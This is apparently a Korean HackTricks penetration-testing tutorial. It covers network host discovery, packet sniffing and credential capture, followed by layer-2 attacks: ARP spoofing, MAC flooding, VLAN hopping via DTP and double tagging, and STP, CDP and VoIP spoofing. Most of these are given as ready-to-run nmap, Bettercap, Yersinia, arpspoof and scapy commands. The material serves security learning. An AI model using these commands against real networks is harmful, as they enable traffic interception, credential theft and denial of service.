# 네트워크 펜테스팅

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요**.
* **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요**.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: **해커들에 의해 만들어진 프리미엄 버그 바운티 플랫폼**인 **Intigriti에 가입하세요**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 참여하여 **최대 $100,000**의 바운티를 획득하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## 외부에서 호스트 발견하기

이것은 **인터넷에서 응답하는 IP를 찾는 방법**에 대한 **간단한 섹션**이 될 것입니다.\
이 상황에서는 일부 **IP 범위** (아마도 여러 **범위**조차도)가 있고 **어떤 IP가 응답하는지 찾기만** 하면 됩니다.

### ICMP

호스트가 켜져 있는지 여부를 확인하는 가장 **쉽고 빠른 방법**입니다.\
일부 **ICMP** 패킷을 보내 응답을 기대해볼 수 있습니다. 가장 쉬운 방법은 **에코 요청**을 보내고 응답을 기대하는 것입니다. 이를 위해 간단한 `ping` 또는 **범위**에 대해 `fping`을 사용할 수 있습니다.\
**nmap**을 사용하여 다른 유형의 ICMP 패킷을 보낼 수도 있습니다 (이렇게 하면 일반적인 ICMP 에코 요청-응답에 대한 필터링을 피할 수 있습니다).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP 포트 탐지

모든 종류의 ICMP 패킷이 필터링되는 것이 매우 흔합니다. 그럼 호스트가 살아 있는지 확인하려면 **열린 포트를 찾아보는 것**이 전부입니다. 각 호스트는 **65535개의 포트**를 가지고 있으므로, "큰" 범위를 가지고 있다면 **각 호스트의 모든 포트**가 열려 있는지 여부를 테스트할 수 없습니다. 그렇게 하면 너무 많은 시간이 소요됩니다.\
그러므로 필요한 것은 **빠른 포트 스캐너**([masscan](https://github.com/robertdavidgraham/masscan))와 **가장 많이 사용되는 포트 목록**입니다:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP 포트 발견

이것은 HTTP 서비스를 발견하고 싶을 때 유용한 TCP 포트 발견입니다.
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP 포트 탐지

또한 **UDP 포트가 열려 있는지 확인**하여 **호스트에 더 많은 주의**를 기울여야 하는지 결정할 수도 있습니다. UDP 서비스는 일반적인 빈 UDP 프로브 패킷에 **어떤 데이터도 응답하지 않기** 때문에 포트가 필터링되었는지 여부를 판단하기 어렵습니다. 이를 결정하는 가장 쉬운 방법은 실행 중인 서비스와 관련된 패킷을 보내는 것이며, 실행 중인 서비스를 알 수 없으므로 포트 번호를 기반으로 가장 가능성이 높은 서비스를 시도해야 합니다:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
이전에 제안된 nmap 라인은 **/24** 범위 내의 모든 호스트에서 **상위 1000개의 UDP 포트**를 테스트할 것이지만, 심지어 이것만으로도 **>20분**이 걸릴 것입니다. 더 빠른 결과가 필요하다면 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)를 사용할 수 있습니다: `./udp-proto-scanner.pl 199.66.11.53/24` 이는 이러한 **UDP 프로브**를 해당 **예상 포트**로 보낼 것입니다 (/24 범위에 대해서는 1분 정도 소요될 것입니다): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP 포트 탐지
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## 와이파이 펜테스팅

여기에서는 작성 시점에서 알려진 모든 Wifi 공격에 대한 좋은 가이드를 찾을 수 있습니다:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## 내부에서 호스트 발견

네트워크 내부에 있다면 **다른 호스트를 발견**하고 싶어할 것입니다. **얼마나 많은 노이즈**를 만들고 싶은지에 따라 다양한 작업을 수행할 수 있습니다:

### 수동

다음 도구를 사용하여 연결된 네트워크 내부의 호스트를 수동으로 발견할 수 있습니다:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### 활성

[_**외부에서 호스트 발견하기**_](./#discovering-hosts-from-the-outside)에 주석 처리된 기술들을 참고하세요. (_TCP/HTTP/UDP/SCTP 포트 발견_)\
그러나, 다른 호스트들과 **동일한 네트워크**에 있기 때문에 **더 많은 작업**을 수행할 수 있습니다:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### 활성 ICMP

_외부에서 호스트 찾기_ 에서 설명된 기술들([_**ICMP**_](./#icmp))은 여기에도 **적용**될 수 있음을 주의하라.\
하지만, 다른 호스트들과 **동일한 네트워크**에 있기 때문에 **더 많은 작업**을 할 수 있음:

* **서브넷 브로드캐스트 주소**를 **ping**하면 각 호스트에게 ping이 도달하고 그들이 **응답**할 수 있음: `ping -b 10.10.5.255`
* **네트워크 브로드캐스트 주소**를 핑하면 **다른 서브넷 내의 호스트**를 찾을 수도 있음: `ping -b 255.255.255.255`
* `-PE`, `-PP`, `-PM` 플래그를 사용하여 `nmap`을 통해 호스트 발견을 수행할 수 있음. 각각 **ICMPv4 echo**, **timestamp**, **서브넷 마스크 요청**을 보내는 것: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan은 **네트워크 메시지**를 통해 컴퓨터를 **켜는 데 사용**됨. 컴퓨터를 켜기 위해 사용되는 매직 패킷은 **MAC Dst**가 제공되고 그 후 **동일한 패킷 내에서 16번 반복**되는 패킷임.\
이러한 종류의 패킷은 일반적으로 **이더넷 0x0842** 또는 **포트 9로의 UDP 패킷**으로 전송됨.\
**\[MAC]**이 제공되지 않으면, 패킷은 **브로드캐스트 이더넷**으로 전송됨(브로드캐스트 MAC이 반복됨).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 호스트 스캔

특정 IP(외부 또는 내부)를 심층 스캔하고 싶다면 다양한 작업을 수행할 수 있습니다.

### TCP

* **열린** 포트: _SYN --> SYN/ACK --> RST_
* **닫힌** 포트: _SYN --> RST/ACK_
* **필터링된** 포트: _SYN --> \[응답 없음]_
* **필터링된** 포트: _SYN --> ICMP 메시지_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP 포트를 스캔하는 두 가지 옵션이 있습니다:

* **UDP 패킷**을 보내고 포트가 **닫혀 있으면 ICMP unreachable** 응답을 확인합니다 (여러 경우에 ICMP가 **필터링**되어 포트가 열려 있거나 닫혀 있는지에 대한 정보를 받지 못할 수 있습니다).
* **포맷된 데이터그램**을 보내 응답을 유도합니다 (예: DNS, DHCP, TFTP 등의 **서비스**에서). 응답을 받으면 포트가 **열려 있다는 것**입니다.

**Nmap**은 "-sV"를 사용하여 **두 가지 옵션을 혼합**합니다 (UDP 스캔은 매우 느립니다), 그러나 UDP 스캔이 TCP 스캔보다 느립니다:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP 스캔

**SCTP (Stream Control Transmission Protocol)**은 **TCP (Transmission Control Protocol)** 및 **UDP (User Datagram Protocol)**와 함께 사용되도록 설계되었습니다. 주요 목적은 IP 네트워크 상에서 전화 데이터의 전송을 용이하게 하는 것으로, **Signaling System 7 (SS7)**에서 발견되는 신뢰성 기능을 많이 반영합니다. **SCTP**는 **SIGTRAN** 프로토콜 패밀리의 핵심 구성 요소로, IP 네트워크 상에서 SS7 신호를 전송하는 것을 목표로 합니다.

**SCTP** 지원은 **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, **VxWorks** 등 다양한 운영 체제에서 제공되며, 이는 통신 및 네트워킹 분야에서의 광범위한 수용 및 유틸리티를 나타냅니다.

nmap에서는 **SCTP**에 대해 두 가지 다른 스캔을 제공합니다: _-sY_ 및 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 및 IPS 회피

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **더 많은 nmap 옵션**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### 내부 IP 주소 노출

**구성 오류가 있는 라우터, 방화벽 및 네트워크 장치**는 때때로 **비공개 소스 주소**를 사용하여 네트워크 프로브에 응답합니다. **tcpdump**를 사용하여 테스트 중에 비공개 주소에서 수신된 패킷을 식별할 수 있습니다. 특히 Kali Linux에서는 **eth2 인터페이스**에서 패킷을 캡처할 수 있으며, 이는 공개 인터넷에서 접근할 수 있습니다. 설정이 NAT 또는 방화벽 뒤에 있는 경우 해당 패킷은 필터링될 가능성이 높다는 점을 유의해야 합니다.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## 스니핑

스니핑을 통해 캡처된 프레임과 패킷을 검토함으로써 IP 범위, 서브넷 크기, MAC 주소 및 호스트 이름의 세부 정보를 파악할 수 있습니다. 네트워크가 잘못 구성되었거나 스위칭 패브릭이 스트레스를 받는 경우, 공격자는 수동 네트워크 스니핑을 통해 민감한 자료를 캡처할 수 있습니다.

스위칭된 이더넷 네트워크가 올바르게 구성된 경우, 브로드캐스트 프레임과 당신의 MAC 주소로 전송된 자료만 볼 수 있습니다.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
한편, Wireshark를 GUI로 사용하여 SSH 세션을 통해 원격 컴퓨터에서 실시간으로 데이터 패킷을 캡처할 수 있습니다.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

당연히.

### 자격 증명 캡처

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)와 같은 도구를 사용하여 pcap 또는 라이브 인터페이스에서 자격 증명을 구문 분석할 수 있습니다.

## LAN 공격

### ARP 스푸핑

ARP 스푸핑은 기계의 IP가 우리의 장치의 MAC을 가지고 있다고 나타내는 무료 ARPResponses를 보내는 것을 의미합니다. 그런 다음 피해자는 ARP 테이블을 변경하고 IP 스푸핑을 연락하려고 할 때마다 우리의 기계에 연락할 것입니다.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM 오버플로우

다양한 소스 MAC 주소를 사용하여 많은 패킷을 전송하여 스위치의 CAM 테이블을 오버플로우시킵니다. CAM 테이블이 가득 차면 스위치가 허브처럼 동작하기 시작합니다 (모든 트래픽을 브로드캐스팅).
```bash
macof -i <interface>
```
현대 스위치에서는 이 취약점이 수정되었습니다.

### 802.1Q VLAN / DTP 공격

#### 동적 트렁킹

**동적 트렁킹 프로토콜 (DTP)**은 트렁킹을 자동화하는 링크 계층 프로토콜로 설계되어 있으며, 스위치가 자동으로 트렁크 모드(Trunk) 또는 비트렁크 모드를 선택할 수 있게 합니다. **DTP**의 배포는 종종 최적의 네트워크 디자인의 표시로 간주되며, 필요한 경우에만 트렁크를 수동으로 구성하고 적절한 문서화를 보장하는 중요성을 강조합니다.

기본적으로 스위치 포트는 동적 자동 모드로 설정되어 있어 인접한 스위치에 의해 유도되면 트렁킹을 시작할 준비가 되어 있습니다. 보안 문제가 발생하는 경우, 펜테스터 또는 공격자가 스위치에 연결하고 DTP Desirable 프레임을 보내면 포트가 트렁크 모드로 전환됩니다. 이 작업을 통해 공격자는 STP 프레임 분석을 통해 VLAN을 열거하고 가상 인터페이스를 설정하여 VLAN 분할을 우회할 수 있습니다.

많은 스위치에서 DTP의 기본 존재는 적대적인 자들이 스위치의 동작을 모방하여 모든 VLAN을 통해 트래픽에 액세스할 수 있도록 이용할 수 있습니다. [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) 스크립트는 인터페이스를 모니터링하는 데 사용되며, 스위치가 Default, Trunk, Dynamic, Auto 또는 Access 모드 중 어느 모드에 있는지 확인하여 VLAN 호핑 공격에 면역인 Access 모드만을 식별합니다. 이 도구는 스위치의 취약성 상태를 평가합니다.

네트워크 취약성이 확인되면 _**Yersinia**_ 도구를 사용하여 DTP 프로토콜을 통해 "트렁킹을 활성화"시킬 수 있어 모든 VLAN에서 패킷을 관찰할 수 있습니다.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

VLAN을 열거하기 위해 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** 스크립트를 사용하여 DTP Desirable 프레임을 생성할 수도 있습니다.** 어떠한 상황에서도 스크립트를 중단하지 마십시오. **스크립트는 3초마다 DTP Desirable을 삽입합니다.** **스위치에서 동적으로 생성된 트렁크 채널은 다섯 분 동안만 유지됩니다. 다섯 분이 지나면 트렁크가 끊깁니다.**
```
sudo python3 DTPHijacking.py --interface eth0
```
접근 가능/희망 (0x03)은 DTP 프레임이 희망 유형임을 나타내며, 해당 포트에 트렁크 모드로 전환하도록 지시합니다. 그리고 802.1Q/802.1Q (0xa5)은 802.1Q 캡슐화 유형을 나타냅니다.

STP 프레임을 분석함으로써 VLAN 30과 VLAN 60의 존재를 알 수 있습니다.

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### 특정 VLAN 공격

VLAN ID 및 IP 값이 알려진 경우, 가상 인터페이스를 구성하여 특정 VLAN을 공격할 수 있습니다.\
DHCP를 사용할 수 없는 경우 _ifconfig_를 사용하여 정적 IP 주소를 설정하십시오.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### 자동 VLAN 호퍼

**다이내믹 트렁킹 및 가상 인터페이스 생성 및 다른 VLAN 내의 호스트 발견**에 대한 논의된 공격은 다음 도구에 의해 **자동으로 수행**됩니다: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### 더블 태깅

공격자가 피해자 호스트의 **MAC, IP 및 VLAN ID 값**을 알고 있다면, 해당 호스트의 VLAN 및 피해자의 VLAN으로 **프레임에 더블 태그를 시도**하고 패킷을 보낼 수 있습니다. **피해자가 공격자에 다시 연결할 수 없기** 때문에, **공격자에게 가장 좋은 옵션은 UDP를 통해 통신하는 것**입니다. 이를 통해 SNMP와 같은 흥미로운 작업을 수행할 수 있는 프로토콜로 통신할 수 있습니다.

공격자의 다른 옵션은 **공격자가 제어하는 IP를 위조하고 피해자가 접근할 수 있는 TCP 포트 스캔을 실행**하는 것입니다 (아마도 인터넷을 통해). 그런 다음, 공격자는 두 번째 호스트에서 패킷을 수신하는지 확인할 수 있습니다.

![](<../../.gitbook/assets/image (190).png>)

이 공격을 수행하려면 scapy를 사용할 수 있습니다: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### 측면 VLAN 세분화 우회 <a href="#d679" id="d679"></a>

만약 **직접 연결된 스위치에 액세스**할 수 있다면, 네트워크 내에서 **VLAN 세분화를 우회**할 수 있습니다. 간단히 **포트를 트렁크 모드로 전환**하고 대상 VLAN의 ID로 가상 인터페이스를 생성하고 IP 주소를 구성하면 됩니다. 주소를 동적으로 요청(DHCP)하거나 정적으로 구성할 수 있습니다. 상황에 따라 다릅니다.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### 레이어 3 개인 VLAN 우회

일부 환경에서는 게스트 무선 네트워크와 같이 **포트 격리(개인 VLAN으로도 알려짐)** 설정이 구현되어 무선 액세스 포인트에 연결된 클라이언트가 서로 직접 통신하는 것을 방지합니다. 그러나 이러한 격리 조치를 우회할 수 있는 기술이 식별되었습니다. 이 기술은 네트워크 ACL이 부족하거나 부적절하게 구성되어 IP 패킷이 라우터를 통해 다른 클라이언트에게 라우팅되도록 하는 것을 이용합니다.

이 공격은 **목적 클라이언트의 IP 주소를 가진 패킷을 라우터의 MAC 주소와 함께 전송**하여 실행됩니다. 이로 인해 라우터가 패킷을 잘못된 대상 클라이언트로 전달하게 됩니다. 이 접근 방식은 피해자에게 접근 가능한 호스트를 제어하여 보안 결함을 악용하는 이중 태깅 공격에서 사용되는 방식과 유사합니다.

**공격의 주요 단계:**

1. **패킷 생성:** 목적 클라이언트의 IP 주소를 포함하고 라우터의 MAC 주소를 가진 패킷을 특별히 생성합니다.
2. **라우터 동작 악용:** 생성된 패킷이 라우터로 전송되어, 구성에 따라 라우터가 패킷을 대상 클라이언트로 리디렉션하여 개인 VLAN 설정이 제공하는 격리를 우회합니다.

### VTP 공격

VTP (VLAN Trunking Protocol)는 VLAN 관리를 중앙화합니다. VLAN 데이터베이스 무결성을 유지하기 위해 수정이 발생할 때마다 리비전 번호를 사용합니다. 스위치는 더 높은 리비전 번호의 구성을 채택하여 자체 VLAN 데이터베이스를 업데이트합니다.

#### VTP 도메인 역할

* **VTP 서버:** VLAN을 관리하며 생성, 삭제, 수정합니다. 도메인 구성원에게 VTP 공지를 브로드캐스트합니다.
* **VTP 클라이언트:** VTP 공지를 수신하여 VLAN 데이터베이스를 동기화합니다. 이 역할은 로컬 VLAN 구성 수정을 제한합니다.
* **VTP 투명:** VTP 업데이트에 참여하지 않지만 VTP 공지를 전달합니다. VTP 공격에 영향을 받지 않으며 리비전 번호를 0으로 유지합니다.

#### VTP 공지 유형

* **요약 공지:** VTP 서버가 300초마다 브로드캐스트하는 핵심 도메인 정보를 포함합니다.
* **부분 공지:** VLAN 구성 변경 후 전송됩니다.
* **공지 요청:** VTP 클라이언트가 더 높은 구성 리비전 번호를 감지하고 일반적으로 요약 공지를 요청하는 경우 발행됩니다.

VTP 취약점은 VTP 공지가 트렁크 포트를 통해서만 순환되기 때문에 트렁크 포트를 통해서만 악용할 수 있습니다. DTP 공격 시나리오 이후 VTP로 이어질 수 있습니다. Yersinia와 같은 도구는 VTP 공격을 용이하게 하여 VLAN 데이터베이스를 삭제하고 네트워크를 효과적으로 방해할 수 있습니다.

참고: 이 토론은 VTP 버전 1 (VTPv1)에 관련됩니다.
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### STP 공격

**인터페이스에서 BPDU 프레임을 캡처할 수 없는 경우 STP 공격에 성공할 가능성이 적습니다.**

#### **STP BPDU DoS**

많은 양의 BPDUs TCP (Topology Change Notification) 또는 Conf (토폴로지가 생성될 때 전송되는 BPDUs)를 보내면 스위치가 과부하되어 제대로 작동을 멈출 수 있습니다.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 공격**

TCP를 보내면 스위치의 CAM 테이블이 15초 후에 삭제됩니다. 그 후 이러한 종류의 패킷을 계속해서 보내면 CAM 테이블이 계속 재시작됩니다 (또는 매 15초마다) 그리고 재시작되면 스위치는 허브처럼 동작합니다.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP 루트 공격**

공격자는 스위치의 동작을 모방하여 네트워크의 STP 루트가 됩니다. 그런 다음, 더 많은 데이터가 그를 통해 통과하게 됩니다. 이는 두 개의 다른 스위치에 연결되어 있는 경우 특히 흥미로울 수 있습니다.\
이는 BPDUs CONF 패킷을 보내어 **우선 순위(priority)** 값이 실제 루트 스위치의 실제 우선 순위보다 작다고 말하는 것으로 수행됩니다.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**만약 공격자가 2개의 스위치에 연결되어 있다면, 그는 새 트리의 루트가 될 수 있으며 그 두 스위치 사이의 모든 트래픽이 그를 통과하게 될 것입니다** (MITM 공격이 수행될 것입니다).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 공격

시스코 디스커버리 프로토콜(CDP)은 시스코 장치 간의 통신에 필수적이며 **서로를 식별하고 구성 세부 정보를 공유**할 수 있게 합니다.

#### 수동 데이터 수집 <a href="#id-0e0f" id="id-0e0f"></a>

CDP는 모든 포트를 통해 정보를 브로드캐스트하도록 구성되어 있어 보안 위험으로 이어질 수 있습니다. 공격자는 스위치 포트에 연결한 후 **Wireshark**, **tcpdump**, 또는 **Yersinia**와 같은 네트워크 스니퍼를 배치할 수 있습니다. 이 작업은 네트워크 장치에 대한 민감한 데이터를 노출시킬 수 있으며, 해당 장치의 모델 및 Cisco IOS 버전을 포함합니다. 공격자는 그런 다음 식별된 Cisco IOS 버전의 특정 취약점을 대상으로 할 수 있습니다.

#### CDP 테이블 플러딩 유도 <a href="#id-0d6a" id="id-0d6a"></a>

더 공격적인 접근 방식은 스위치의 메모리를 압도하여 서비스 거부(DoS) 공격을 발동하고, 합법적인 시스코 장치인 것처럼 가장하는 것입니다. 아래는 테스트를 위해 설계된 네트워크 도구인 Yersinia를 사용하여 이러한 공격을 시작하는 명령 시퀀스입니다:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
이 공격 중에는 스위치의 CPU 및 CDP 이웃 테이블이 심하게 부담을 받아 자원 소비가 과도하여 종종 **“네트워크 마비”**로 불리는 상황이 발생합니다.

#### CDP 위장 공격
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
당신은 [**scapy**](https://github.com/secdev/scapy/)를 사용할 수도 있습니다. `scapy/contrib` 패키지와 함께 설치해야 합니다.

### VoIP 공격 및 VoIP Hopper 도구

IoT 장치와 점점 통합되는 VoIP 전화기는 특별한 전화번호를 통해 문을 열거나 온도 조절기를 제어하는 기능을 제공합니다. 그러나 이 통합은 보안 위험을 야기할 수 있습니다.

[**voiphopper**](http://voiphopper.sourceforge.net) 도구는 다양한 환경(Cisco, Avaya, Nortel, Alcatel-Lucent)에서 VoIP 전화기를 흉내 내도록 설계되었습니다. 이 도구는 CDP, DHCP, LLDP-MED, 802.1Q ARP와 같은 프로토콜을 사용하여 음성 네트워크의 VLAN ID를 발견합니다.

**VoIP Hopper**는 Cisco Discovery Protocol (CDP)에 대해 세 가지 모드를 제공합니다:

1. **스니핑 모드** (`-c 0`): 네트워크 패킷을 분석하여 VLAN ID를 식별합니다.
2. **스푸핑 모드** (`-c 1`): 실제 VoIP 장치와 유사한 사용자 정의 패킷을 생성합니다.
3. **미리 만들어진 패킷을 사용한 스푸핑 모드** (`-c 2`): 특정 Cisco IP 전화기 모델의 패킷과 동일한 패킷을 보냅니다.

속도를 위한 선호되는 모드는 세 번째 모드입니다. 이를 위해 다음을 지정해야 합니다:

* 공격자의 네트워크 인터페이스(`-i` 매개변수).
* 흉내 내려는 VoIP 장치의 이름(`-E` 매개변수), Cisco 네이밍 형식을 준수해야 합니다 (예: MAC 주소 뒤에 이어지는 SEP).

기업 환경에서 기존 VoIP 장치를 모방하기 위해 다음을 수행할 수 있습니다:

* 전화기의 MAC 레이블을 검사합니다.
* 모델 정보를 보기 위해 전화기의 디스플레이 설정을 탐색합니다.
* 노트북에 VoIP 장치를 연결하고 Wireshark를 사용하여 CDP 요청을 관찰합니다.

세 번째 모드에서 도구를 실행하는 예시 명령어는 다음과 같습니다:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 공격

#### 열거
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
